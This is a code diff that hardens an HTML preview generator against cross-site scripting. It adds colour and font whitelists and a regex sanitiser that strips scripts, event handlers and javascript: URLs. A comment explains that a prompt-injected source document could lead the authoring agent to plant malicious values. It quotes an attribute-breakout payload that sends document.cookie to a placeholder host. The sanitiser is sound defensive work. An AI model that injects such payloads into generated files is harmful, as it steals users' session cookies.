@@ -51,6 +51,7 @@ the page renders the same offline (no webfont dependency).
 import html
 import json
 import os
+import re
 import sys
 
 _DEFAULTS = {
@@ -86,12 +87,86 @@ _SKELETONS = ("statement", "split", "island", "band", "rail", "dashboard", "full
 _SKELETON_PREVIEW = {"dashboard": "split", "full-bleed": "statement", "gallery": "split"}
 
 
+# ── preview hardening ────────────────────────────────────────────────────────────────────────
+# The preview is an HTML file the USER opens in their own browser, and every field in it comes out
+# of `directions.json`, which the agent authors while reading the user's source material. A
+# prompt-injected paper or deck can therefore reach these values. Text already went through
+# `_esc()`; COLOURS did not, and they are interpolated into `style="…"` attributes in ~86 places,
+# so a value like `#fff" onmouseover="fetch('http://x/'+document.cookie)` broke out of the
+# attribute. Normalising HERE, at the one function every direction passes through, fixes all of
+# them at once — editing 86 f-strings would leave the 87th.
+_COLOUR_OK = re.compile(
+    r"^(#[0-9a-fA-F]{3,8}"                                  # #rgb #rgba #rrggbb #rrggbbaa
+    r"|rgba?\(\s*[\d.]+%?(\s*[, ]\s*[\d.]+%?){2,3}\s*\)"    # rgb()/rgba()
+    r"|hsla?\(\s*[\d.]+(deg)?(\s*[, ]\s*[\d.]+%?){2,3}\s*\)"
+    r"|[a-zA-Z]{3,20})$")                                   # a CSS colour keyword
+_COLOUR_KEYS = ("bg", "ink", "grey", "mute", "line", "light", "accent")
+# CSS font-family lists are also attribute-interpolated. Allow the shapes a font stack really has.
+_FONT_OK = re.compile(r"^[\w \-,'\"]{1,120}$")
+
+# `cover_motif` / `ambient_motif` are RAW HTML **by design** — a bespoke register draws its own
+# signature (SVG, styled divs) and the 5.0.0 direction-gate structure check requires at most one
+# motif-less colourway, so escaping them outright would delete the capability the gate demands.
+# What is stripped is only what can EXECUTE: script/iframe/object/embed elements, on* handlers,
+# and javascript:/vbscript:/data:text-html URLs. Shape and colour survive; behaviour does not.
+# Whole ELEMENT including its body: stripping only the tags left the script's source visible as
+# page text ("alert(3)"), which is inert but relies on the tag-strip having caught every opener.
+# Removing the element outright means a missed variant leaks nothing readable either.
+_KILL_BLOCK = re.compile(r"<\s*(script|style|iframe|object|embed|form)\b[^>]*>.*?"
+                         r"<\s*/\s*\1\s*>", re.I | re.S)
+_KILL_EL = re.compile(r"<\s*/?\s*(script|style|iframe|object|embed|link|meta|base|form)\b[^>]*>",
+                      re.I)
+_KILL_ON = re.compile(r"\son[a-z]+\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.I)
+_KILL_URL = re.compile(r"(javascript|vbscript)\s*:|data\s*:\s*text/html", re.I)
+
+
+def _safe_colour(v, fallback, name, key, warn):
+    t = str(v).strip()
+    if _COLOUR_OK.match(t):
+        return t
+    warn.append(f"{name}.{key}={v!r}")
+    return fallback
+
+
+def sanitize_motif(html_frag):
+    """Strip the executable half of a bespoke register's raw-HTML motif. Public for the tests."""
+    if not html_frag:
+        return html_frag
+    out = _KILL_BLOCK.sub("", str(html_frag))
+    out = _KILL_EL.sub("", out)
+    out = _KILL_ON.sub("", out)
+    out = _KILL_URL.sub("blocked:", out)
+    return out
+
+
 def _norm(d):
     s = dict(_DEFAULTS)
     s.update({k: v for k, v in d.items() if v is not None})
     if not s.get("accents"):
         s["accents"] = [s["accent"]]
     s["name"] = d.get("name", "Direction")
+    warn = []
+    for k in _COLOUR_KEYS:
+        if k in s:
+            s[k] = _safe_colour(s[k], _DEFAULTS.get(k, "#333333"), s["name"], k, warn)
+    if isinstance(s.get("accents"), (list, tuple)):
+        s["accents"] = [_safe_colour(a, s["accent"], s["name"], "accents[]", warn)
+                        for a in s["accents"]]
+    for k in ("font_display", "font_body"):
+        if k in s and not _FONT_OK.match(str(s[k])):
+            warn.append(f"{s['name']}.{k}={s[k]!r}")
+            s[k] = _DEFAULTS[k]
+    for k in ("cover_motif", "ambient_motif"):
+        if s.get(k):
+            cleaned = sanitize_motif(s[k])
+            if cleaned != s[k]:
+                warn.append(f"{s['name']}.{k} (executable markup stripped)")
+            s[k] = cleaned
+    if warn:
+        # Loud, never silent: a rejected value means the preview is not showing what the
+        # directions file asked for, and the author needs to know which field was replaced.
+        print("archetypes_html: unsafe value(s) replaced before rendering the preview — "
+              + "; ".join(warn[:8]), file=sys.stderr)
     # An unknown value must not silently fall back to the default — that would make the gate
     # claim a composition it did not render. Fail loudly instead.
     if s["cover"] not in _COVERS:
